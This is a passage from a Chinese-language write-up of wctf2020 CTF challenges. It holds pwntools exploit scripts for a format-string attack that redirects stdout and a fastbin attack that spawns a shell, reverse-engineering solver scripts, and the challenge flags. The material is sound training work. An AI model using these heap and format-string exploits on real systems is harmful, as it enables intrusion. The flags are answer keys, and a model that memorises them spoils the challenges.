class="hljs-built_in">rdi</span>, <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rax</span>]<br>   <span class="hljs-number">0x7f8f4b0c4894</span> &lt;printf+<span class="hljs-number">148</span>&gt;    <span class="hljs-keyword">call</span>   vfprintf &lt;<span class="hljs-number">0x7f8f4b0bc170</span>&gt;<br> <br>   <span class="hljs-number">0x7f8f4b0c4899</span> &lt;printf+<span class="hljs-number">153</span>&gt;    <span class="hljs-keyword">add</span>    <span class="hljs-built_in">rsp</span>, <span class="hljs-number">0xd8</span><br>   <span class="hljs-number">0x7f8f4b0c48a0</span> &lt;printf+<span class="hljs-number">160</span>&gt;    <span class="hljs-keyword">ret</span>    <br> <br>   <span class="hljs-number">0x7f8f4b0c48a1</span>                 <span class="hljs-keyword">nop</span>    <span class="hljs-built_in">word</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">cs</span>:[<span class="hljs-built_in">rax</span> + <span class="hljs-built_in">rax</span>]<br>.....................................................................<br>pwndbg&gt; telescope <span class="hljs-number">0x7f8f4b0c4891</span>+<span class="hljs-number">0x36e6bf</span><br><span class="hljs-number">00</span>:<span class="hljs-number">0000</span>│   <span class="hljs-number">0x7f8f4b432f50</span> —▸ <span class="hljs-number">0x558030d75020</span> —▸ <span class="hljs-number">0x7f8f4b434620</span> (_IO_2_1_stdout_) ◂— <span class="hljs-number">0xfbad2887</span><br>pwndbg&gt; vmmap<br><span class="hljs-symbol">LEGEND:</span> STACK | HEAP | CODE | DATA | RWX | RODATA<br>    <span class="hljs-number">0x558030b73000</span>     <span class="hljs-number">0x558030b75000</span> r-xp     <span class="hljs-number">2000</span> <span class="hljs-number">0</span>      /mnt/hgfs/shared/challenge/dididada/dididada<br>    <span class="hljs-number">0x558030d74000</span>     <span class="hljs-number">0x558030d75000</span> r--p     <span class="hljs-number">1000</span> <span class="hljs-number">1000</span>   /mnt/hgfs/shared/challenge/dididada/dididada<br>    <span class="hljs-number">0x558030d75000</span>     <span class="hljs-number">0x558030d76000</span> rw-p     <span class="hljs-number">1000</span> <span class="hljs-number">2000</span>   /mnt/hgfs/shared/challenge/dididada/dididada<br><br></code></pre></td></tr></table></figure><p>根据调试可以看到，本来<code>printf</code>是取<code>stdout</code>的，输出流嘛，但是如果我们把<code>.bss</code>出的<code>stdout</code>指针改为指向<code>stderr</code>，那<code>close(1)</code>，是不是就没问啥问题了，反正<code>stderr</code>的<code>fileno</code>是2，而且<code>stdout</code>和<code>stderr</code>地址很接近：</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs crystal">pwndbg&gt; p stdout<br><span class="hljs-variable">$1</span> = (<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">_IO_FILE</span> *) 0<span class="hljs-title">x7f8f4b434620</span> &lt;<span class="hljs-title">_IO_2_1_stdout_</span>&gt;</span><br>pwndbg&gt; p stderr<br><span class="hljs-variable">$2</span> = (<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">_IO_FILE</span> *) 0<span class="hljs-title">x7f8f4b434540</span> &lt;<span class="hljs-title">_IO_2_1_stderr_</span>&gt;</span><br></code></pre></td></tr></table></figure><p>综上，得到思路为：</p><ul><li>ask_time泄露程序基地址</li><li>leak泄露<code>stderr</code>的第二个字节，（为了消除那1&#x2F;16的概率</li><li>fmt_attack，把secret第一个字节改为<code>\x00</code>，在把bss段里的<code>stdout</code>改为指向<code>stderr</code></li></ul><p>最终exp为：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta"># usage: python exp.py REMOTE=x.x.x.x</span><br>from pwn import *<br><br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br><br>def debug(addr,PIE=True):<br><span class="hljs-keyword">if</span> PIE:<br>text_base = <span class="hljs-type">int</span>(os.popen(<span class="hljs-string">&quot;pmap &#123;&#125;| awk &#x27;&#123;&#123;print $1&#125;&#125;&#x27;&quot;</span>.format(p.pid)).readlines()[<span class="hljs-number">1</span>], <span class="hljs-number">16</span>)<br>gdb.attach(p,<span class="hljs-string">&#x27;b *&#123;&#125;&#x27;</span>.format(hex(text_base+addr)))<br><span class="hljs-keyword">else</span>:<br>gdb.attach(p,<span class="hljs-string">&quot;b *&#123;&#125;&quot;</span>.format(hex(addr)))<br><br>def cmd(command):<br>p.recvuntil(<span class="hljs-string">&quot;&gt;&gt;&quot;</span>)<br>p.sendline(str(command))<br><br>def main(host,port=<span class="hljs-number">16253</span>):<br>global p<br><span class="hljs-keyword">if</span> host:<br>p = remote(host,port)<br><span class="hljs-keyword">else</span>:<br>p = process(<span class="hljs-string">&quot;./dididada&quot;</span>)<br><span class="hljs-meta"># gdb.attach(p)</span><br>debug(<span class="hljs-number">0x000000000000ECC</span>)<br>p.recvuntil(<span class="hljs-string">&quot;me the time:&quot;</span>)<br>p.send(<span class="hljs-string">&quot;+\n+\n+\n&quot;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;:&quot;</span>)<br>elf_base = <span class="hljs-type">int</span>(p.recvuntil(<span class="hljs-string">&quot;:&quot;</span>)[:<span class="hljs-number">-1</span>]) - <span class="hljs-number">0xbd5</span><br>info(<span class="hljs-string">&quot;elf : &quot;</span> + hex(elf_base))<br><span class="hljs-meta">#leak stdout</span><br>cmd(<span class="hljs-number">1</span>)<br>p.send(p64(elf_base+<span class="hljs-number">0x000000000202041</span>))<br><span class="hljs-built_in">stderr</span> = (ord(p.recv(<span class="hljs-number">1</span>))&lt;&lt;<span class="hljs-number">8</span>)|<span class="hljs-number">0x40</span><br><span class="hljs-meta">#fmt attack</span><br>cmd(<span class="hljs-number">2</span>)<br>payload = <span class="hljs-string">&quot;%11$hn%&#123;&#125;c%12$hn&quot;</span>.format(<span class="hljs-built_in">stderr</span>)<br>payload = payload.ljust(<span class="hljs-number">0x18</span>,<span class="hljs-string">&quot;+&quot;</span>)+p64(elf_base+<span class="hljs-number">0x000000000202060</span>)<br>payload += p64(elf_base+<span class="hljs-number">0x202020</span>)<br><br>p.send(payload)<br>cmd(<span class="hljs-number">3</span>)<br>p.send(<span class="hljs-string">&quot;\x00&quot;</span>*<span class="hljs-number">0x40</span>)<br>p.interactive()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>main(args[<span class="hljs-string">&#x27;REMOTE&#x27;</span>])<br></code></pre></td></tr></table></figure><h2 id="easyfast-2-solves"><a href="#easyfast-2-solves" class="headerlink" title="easyfast - 2 solves"></a>easyfast - 2 solves</h2><blockquote><p>Author: ColdShield</p></blockquote><p>flag:<code>wctf2020&#123;THE_MOST_EASY_FASTBINATTACK&#125;</code></p><p>预期是最简单的fastbin attack（但是出题是在比赛前夕补上的一道，粗心没给下标做检查导致和前面的题变成一个性质了…）</p><p>程序只能malloc三次，而且三次都只能是fast chunk，free的时候没有检查指针也没有对指针清零，Modify也是直接read 8个字节，没有多余检查</p><p>程序getshell只需要满足data段的变量为0即可，然后在data段上有一个0x50的fakesize</p><p><img src="https://s1.ax1x.com/2020/03/30/GnjA6U.png" alt="GnjA6U.png"></p><p>所以思路就是 </p><p><code>malloc(0x48)-&gt;free(array[0])-&gt;modify(array[0],p64(&amp;fakesize-8))</code></p><p><code>-&gt;malloc(0x48)-&gt;malloc(0x48)-&gt;modify(array[0],p64(0))</code></p><p><strong>exp</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-keyword">from</span> __future__ <span class="hljs-keyword">import</span> print_function<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>binary = <span class="hljs-string">&#x27;./easyheap&#x27;</span><span class="hljs-comment">#binary&#x27;s name here</span><br>context.binary = binary<span class="hljs-comment">#context here</span><br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>pty = process.PTY<br>p = process(binary, aslr = <span class="hljs-number">1</span>, stdin=pty, stdout=pty)<span class="hljs-comment">#process option here</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">Host =&#x27;101.200.53.102&#x27;</span><br><span class="hljs-string">Port =22222</span><br><span class="hljs-string">p = remote(Host,Port)</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br>elf = ELF(binary)<br>libc = elf.libc<br><br>my_u64 = <span class="hljs-keyword">lambda</span> x: u64(x.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\x00&#x27;</span>))<br>my_u32 = <span class="hljs-keyword">lambda</span> x: u32(x.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\x00&#x27;</span>))<br>global_max_fast=<span class="hljs-number">0x3c67f8</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">loginfo</span>(<span class="hljs-params">what=<span class="hljs-string">&#x27;&#x27;</span>,address=<span class="hljs-number">0</span></span>):<br>log.info(<span class="hljs-string">&quot;\033[1;36m&quot;</span> + what + <span class="hljs-string">&#x27;-----&gt;&#x27;</span> + <span class="hljs-built_in">hex</span>(address) + <span class="hljs-string">&quot;\033[0m&quot;</span>)<br><br><span class="hljs-comment"># todo here</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Alloc</span>(<span class="hljs-params">size</span>):<br>p.recvuntil(<span class="hljs-string">&quot;choice&gt;\n&quot;</span>)<br>p.sendline(<span class="hljs-string">&quot;1&quot;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;size&gt;\n&quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(size))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Free</span>(<span class="hljs-params">index</span>):<br>p.recvuntil(<span class="hljs-string">&quot;choice&gt;\n&quot;</span>)<br>p.sendline(<span class="hljs-string">&quot;2&quot;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;index&gt;\n&quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(index))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Modify</span>(<span class="hljs-params">index,content</span>):<br>p.recvuntil(<span class="hljs-string">&quot;choice&gt;\n&quot;</span>)<br>p.sendline(<span class="hljs-string">&quot;3&quot;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;index&gt;\n&quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(index))<br>p.send(content)<br><br>Alloc(<span class="hljs-number">0x48</span>)<br>Free(<span class="hljs-number">0</span>)<br>Modify(<span class="hljs-number">0</span>,p64(<span class="hljs-number">0x602080</span>))<br>Alloc(<span class="hljs-number">0X48</span>)<br>Alloc(<span class="hljs-number">0X48</span>)<br>Modify(<span class="hljs-number">2</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h1 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h1><h2 id="Cr0ssFun-42-solves"><a href="#Cr0ssFun-42-solves" class="headerlink" title="Cr0ssFun - 42 solves"></a>Cr0ssFun - 42 solves</h2><blockquote><p>Author: 52HeRtz</p></blockquote><p>出这题的前几天，刚好去俄罗斯一个比赛瞧了一眼，发现有个这样的题，差点没把我气死，于是我就差不多的再出了一个类似的题hhhhh。。。</p><p>丢进 IDA，可以看见一堆函数</p><p><img src="https://s1.ax1x.com/2020/03/30/GnXfyD.png" alt="GnXfyD.png"></p><p>可以看见一个check函数，拼命的调用其它函数</p><p><img src="https://s1.ax1x.com/2020/03/30/GnXWQO.png" alt="GnXWQO.png"></p><p><img src="https://s1.ax1x.com/2020/03/30/GnXhOe.png" alt="GnXhOe.png"></p><p>接下来就是不断地套娃，其实就把所有的字符都弄出来就可以了，手动或者写脚本都可以。</p><p>当然出题人作为一个很懒的web狗，当然是喜欢用工具，可以用 angr 求解。</p><p>看起来输入正确的 flag 后会打印 <code>Your flag is correct, go and submit it!</code></p><p>用 angr 求解什么样的输入可以使得程序输出 <code>Your flag is correct, go and submit it!</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> angr<br>proj = angr.Project(<span class="hljs-string">&quot;Cr0ssfun&quot;</span>)<br>simgr = proj.factory.simgr()<br>simgr.explore(find=<span class="hljs-keyword">lambda</span> s: <span class="hljs-string">b&quot;Your flag is correct, go and submit it!&quot;</span> <span class="hljs-keyword">in</span> s.posix.dumps(<span class="hljs-number">1</span>))<br><span class="hljs-built_in">print</span>(simgr.found[<span class="hljs-number">0</span>].posix.dumps(<span class="hljs-number">0</span>))<br></code></pre></td></tr></table></figure><p>等几秒就出来了</p><p><img src="https://s1.ax1x.com/2020/03/30/GnX5eH.jpg" alt="GnX5eH.jpg"></p><h2 id="level1-30-solves"><a href="#level1-30-solves" class="headerlink" title="level1 - 30 solves"></a>level1 - 30 solves</h2><blockquote><p>Author: ColdShield</p></blockquote><p>flag:<code>wctf2020&#123;d9-dE6-20c&#125;</code></p><p><img src="https://s1.ax1x.com/2020/03/30/GnR5ZD.png" alt="GnR5ZD.png"></p><p>程序流程的意思就是：</p><ol><li>从flag这个文件中读出了长度为0x14的字符串到ptr指向的地方去</li><li>从1开始到0x13，循环，i为奇数时输出<code>ptr[i]&lt;&lt;i</code>，i为偶数时输出<code>i*ptr[i]</code>，格式都是<code>%ld</code></li></ol><p>然后程序给出了一个<code>output.txt</code></p><p>根据output逆推出flag即可，这里给一个写的很简陋的py程序供参考</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;output.txt&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>) <span class="hljs-keyword">as</span> f:<br>    i=<span class="hljs-number">1</span><br>    <span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>):<br>        <span class="hljs-keyword">if</span> i%<span class="hljs-number">2</span>==<span class="hljs-number">0</span>:<br>            num=<span class="hljs-built_in">int</span>(f.readline().strip(<span class="hljs-string">&#x27;\n&#x27;</span>))<br>            <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(num/i)),end=<span class="hljs-string">&quot;&quot;</span>),<br>        <span class="hljs-keyword">else</span>:<br>            num=<span class="hljs-built_in">int</span>(f.readline().strip(<span class="hljs-string">&#x27;\n&#x27;</span>))<br>            <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(num&gt;&gt;i),end=<span class="hljs-string">&quot;&quot;</span>),<br>        i+=<span class="hljs-number">1</span><br>        <span class="hljs-keyword">if</span> i==<span class="hljs-number">0x14</span> :<br>            <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure><p>当然因为程序没有输出<code>ptr[0]</code>的内容，所以根据<code>wctf2020&#123;&#125;</code>的格式补上<code>w</code>就可以了</p><h2 id="level2-24-solves"><a href="#level2-24-solves" class="headerlink" title="level2 - 24 solves"></a>level2 - 24 solves</h2><blockquote><p>Author: ColdShield</p></blockquote><p>flag:<code>wctf2020&#123;Just_upx_-d&#125;</code></p><p>程序运行弹<code>where is it?</code></p><p>然后丢进IDA发现啥都没有，这种啥都没有的程序就是很明显加壳的程序</p><p><img src="https://s1.ax1x.com/2020/03/30/Gn02Bn.png" alt="Gn02Bn.png"></p><p>用Detect It Easy查壳，UPX 3.95压缩壳</p><p><img src="https://s1.ax1x.com/2020/03/30/Gn06Xj.png" alt="Gn06Xj.png"></p><p>然后直接用upx对应版本的工具脱壳就好了：<a href="https://github.com/upx/upx/tags">https://github.com/upx/upx/tags</a></p><p>再丢进IDA就能看到flag</p><p><img src="https://s1.ax1x.com/2020/03/30/Gn0fA0.png" alt="Gn0fA0.png"></p><h2 id="level3-26-solves"><a href="#level3-26-solves" class="headerlink" title="level3 - 26 solves"></a>level3 - 26 solves</h2><blockquote><p>Author: ColdShield</p></blockquote><p>flag:<code>wctf2020&#123;Base64_is_the_start_of_reverse&#125;</code></p><p><img src="https://s1.ax1x.com/2020/03/30/Gn0hNV.png" alt="Gn0hNV.png"></p><p>稍微看一下，main程序的意思就是输入一串字符串，随机去执行两个分支，一个分支是用<code>base64_encode</code>编码之后输出编码后的内容，另外一个分支就是那些字符串，很明显就是要解这一串<code>d2G0ZjLwHjS7DmOzZAY0X2lzX3CoZV9zdNOydO9vZl9yZXZlcnGlfD==</code>的码</p><p>但是直接解就会是这样：</p><p><img src="https://s1.ax1x.com/2020/03/30/Gn0ycQ.png" alt="Gn0ycQ.png"></p><p>就是程序说的<code>different from the standard</code></p><p>一般CTF碰到这种情况，要么是<code>base64_encode</code>中的编码算法出了问题，要么是base64的编码table出了问题。显然分析前者会比较麻烦，所以先看看table</p><p><img src="https://s1.ax1x.com/2020/03/30/Gn0o3F.png" alt="Gn0o3F.png"></p><p>IDA里面看上去table是正常的，但是注意一下右边的引用数是没有显示完的，后面还有<code>...</code></p><p>这个时候可以开IDA的<code>Options-&gt;general</code>找到<code>Cross-references</code>下的<code>Disassembly(non-graph)</code>，把这个数值改大一点</p><p><img src="https://s1.ax1x.com/2020/03/30/Gn07jJ.png" alt="Gn07jJ.png"></p><p>可以看到我们的<code>base64_table</code>还在另外一个<code>O_OLookAtYou</code>的函数里面被引用了</p><p>ps：Emmmmm…怎么说呢，出这个题的意思就是想让你们学会看数据引用&amp;发现一些程序中看起来奇怪的函数名，比如这个题目的话，如果一上来就看到了这个<code>O_OLookAtYou</code>就肯定会点进去看一看，就会知道base64_table被改过了，也就知道base64编码出问题多半是因为table而不是算法出问题(节省分析的时间)，虽然说从main的函数调用里面是看不到这个函数的(如下图<code>Xfers graph from</code>)</p><p><img src="https://s1.ax1x.com/2020/03/30/GnWRYj.png" alt="GnWRYj.png"></p><p>因为这个函数的函数指针被放在了ELF中main函数执行之前的初始化段<code>_init_array</code>，在执行main函数之前这个函数就被调用了（linux下用gcc编译之前在函数声明前面加上<code>__attribute__((constructor))</code>）</p><p><img src="https://s1.ax1x.com/2020/03/30/GnWIXV.png" alt="GnWIXV.png"></p><p>这个函数就是把<code>base64_table</code>中前面下标0-9处的十个字符，和后面的下标19~10处的十个字符互相调换了一下</p><p>下面就是根据新的<code>base64_table</code>解刚开始的那串码了，这里不再赘述</p><h2 id="level4-12-solves"><a href="#level4-12-solves" class="headerlink" title="level4 - 12 solves"></a>level4 - 12 solves</h2><blockquote><p>Author: ColdShield</p></blockquote><p>flag:<code>wctf2020&#123;This_IS_A_7reE&#125;</code></p><p><img src="https://s1.ax1x.com/2020/03/30/GnWTmT.png" alt="GnWTmT.png"></p><p>直接运行的话程序是输出这个，学过数据结构的应该能很明显地看到这是在遍历什么东西，(<code>*left</code>，<code>*right</code>：二叉树)</p><p>然后给了两种遍历方式出来的字符串，第三种是显示<code>No way</code>，所以flag肯定就是第三种遍历方式遍历出来的了，再来分析</p><p><strong>init</strong></p><p><img src="https://s1.ax1x.com/2020/03/30/GnWqk4.png" alt="GnWqk4.png"></p><p>首先看到<code>init</code>函数里面做的是一堆初始化的流程，这样直接从IDA看的话应该看不出什么来，想分析这里的话需要我们自己一步步的来简化这些乱七八糟的东西（俗称就是人能看XD）不过这个题不简化这里一样可以写，所以这个简化方式留到开学之后看能不能再跟你们线下讲吧….截图什么的太麻烦了，这里放几张效果图</p><p><img src="https://s1.ax1x.com/2020/03/30/GnWH7F.png" alt="GnWH7F.png"></p><p><img src="https://s1.ax1x.com/2020/03/30/GnWKY9.png" alt="GnWKY9.png"></p><p><img src="https://s1.ax1x.com/2020/03/30/GnWmo4.png" alt="GnWmo4.png"></p><p><strong>type1</strong></p><p><img src="https://s1.ax1x.com/2020/03/30/GnWuFJ.png" alt="GnWuFJ.png"></p><p>可以看到这是一个递归函数，如果写过数据结构树遍历的话肯定特别熟悉，这个是中根遍历的递归算法</p><p><strong>type2</strong></p><p>同样如果对数据结构树遍历熟悉的话可以看出来这个是后根遍历的递归算法</p><p><img src="https://s1.ax1x.com/2020/03/30/GnWMWR.png" alt="GnWMWR.png"></p><p>所以flag就肯定是先根遍历得到的字符串了，可以去网上学一下树的三种遍历中如何根据其中两种遍历得到另外一种，好像还是一个面试题来着？不过我感觉能get到的话就很好理解，这里复原的时候唯一一个可能会卡壳的就是在复原根节点右子树的时候有两个<code>_</code>，要稍微注意一下规律</p><p>ps：一般来说的话如果涉及到数据结构的逆向题，肯定不会像我这样把两种遍历都给出来的….可能就直接一个裸的程序给你让你去找flag，所以这个时候就要学会写脚本or调试硬刚，这个题主要还是希望能让你们熟悉树或其他数据结构应该怎么来分析&amp;这些数据结构在底层是怎么存储的</p><p>如果树太大的情况下还可以直接去硬刚汇编，因为这两个递归函数指令数量都是一样的，只是顺序不同而已，用下面这个IDC脚本把type2的指令顺序交换一下（把putchar放到前面去）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-keyword">auto</span> address1=<span class="hljs-number">0x4007CA</span>;<br>    <span class="hljs-keyword">auto</span> address2=<span class="hljs-number">0x4007EA</span>;<br>    <span class="hljs-keyword">auto</span> address3=<span class="hljs-number">0x4007FB</span>;<br>    <span class="hljs-keyword">auto</span> code1=<span class="hljs-string">&quot;&quot;</span>;<br>    <span class="hljs-keyword">auto</span> i=<span class="hljs-number">0</span>,j=<span class="hljs-number">0</span>;<br>    <br>    <span class="hljs-keyword">for</span>(i=address1;i&lt;address2;i++)<br>    &#123;<br>    code1=code1+Byte(i);<br>    &#125;<br><br>    j=address1;<br>    <span class="hljs-keyword">for</span>(i=address2;i&lt;address3;i++)<br>    &#123;<br>        PatchByte(j++,Byte(i));<br>    &#125;<br>        <br>    <span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-built_in">strlen</span>(code1);i++)<br>    &#123;<br>        PatchByte(j++,ord(code1[i]));<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>再把call指令的偏移用keypatch改改就好了，强行改成先根遍历，效果图<br><img src="https://s1.ax1x.com/2020/03/30/GuC2sP.png" alt="GuC2sP.png"></p><p>执行就有flag</p><p><img src="https://s1.ax1x.com/2020/03/30/GuCgMt.png" alt="GuCgMt.png"></p><h2 id="funnyre-7-solves"><a href="#funnyre-7-solves" class="headerlink" title="funnyre - 7 solves"></a>funnyre - 7 solves</h2><blockquote><p>Author: Tsiao</p><p>当我跟启奡聊到出题的时候，他很热情地在百忙中抽空给我出了一道题，我觉得如果世上还有雷锋，我觉得一定会是 Tsiao。</p></blockquote><p>考察：</p><p>1、 简单花指令的去除</p><p>2、 在有限域上运算的简化</p><p>首先去除花指令：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python">ads = <span class="hljs-number">0x4005B0</span><br><br>end = <span class="hljs-number">0x401DC0</span><br><br>codes = get_bytes(ads, end-ads)<br><br>codes = codes.replace(<span class="hljs-string">&quot;\x74\x03\x75\x01\xe8\x90&quot;</span>, <span class="hljs-string">&quot;\x90\x90\x90\x90\x90\x90&quot;</span>)<br><br>patch_bytes(ads, codes)<br><br><span class="hljs-built_in">print</span> <span class="hljs-string">&quot;[+] patch ok&quot;</span><br></code></pre></td></tr></table></figure><p> 随后可以看到逻辑，进行了数次xor操作，又进行了数次移位操作，这里可以使用IDAPython获取每一个操作的详细数据，然后化简，也可以使用angr进行暴力求解。</p><p>解法一：暴力求解：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python">dt = [<span class="hljs-number">0xd9</span>, <span class="hljs-number">0x2c</span>, <span class="hljs-number">0x27</span>, <span class="hljs-number">0xd6</span>, <span class="hljs-number">0xd8</span>, <span class="hljs-number">0x2a</span>, <span class="hljs-number">0xda</span>, <span class="hljs-number">0x2d</span>, <span class="hljs-number">0xd7</span>, <span class="hljs-number">0x2c</span>, <span class="hljs-number">0xdc</span>, <span class="hljs-number">0xe1</span>, <span class="hljs-number">0xdb</span>, <span class="hljs-number">0x2c</span>, <span class="hljs-number">0xd9</span>, <span class="hljs-number">0xdd</span>, <span class="hljs-number">0x27</span>, <span class="hljs-number">0x2d</span>, <span class="hljs-number">0x2a</span>, <span class="hljs-number">0xdc</span>, <span class="hljs-number">0xdb</span>, <span class="hljs-number">0x2c</span>, <span class="hljs-number">0xe1</span>, <span class="hljs-number">0x29</span>, <span class="hljs-number">0xda</span>, <span class="hljs-number">0xda</span>, <span class="hljs-number">0x2c</span>, <span class="hljs-number">0xda</span>, <span class="hljs-number">0x2a</span>, <span class="hljs-number">0xd9</span>, <span class="hljs-number">0x29</span>, <span class="hljs-number">0x2a</span>]<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">kaisa</span>(<span class="hljs-params">xx, kk</span>):<br>    <span class="hljs-keyword">return</span> [(x+kk) &amp; <span class="hljs-number">0xFF</span> <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> xx]<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">xor</span>(<span class="hljs-params">xx, kk</span>):<br>    <span class="hljs-keyword">return</span> [x ^ kk <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> xx]<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">check</span>(<span class="hljs-params">xx</span>):<br>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> xx:<br>        <span class="hljs-keyword">if</span> x &lt; <span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;0&#x27;</span>) <span class="hljs-keyword">or</span> (x &gt; <span class="hljs-built_in">ord</span>(<span 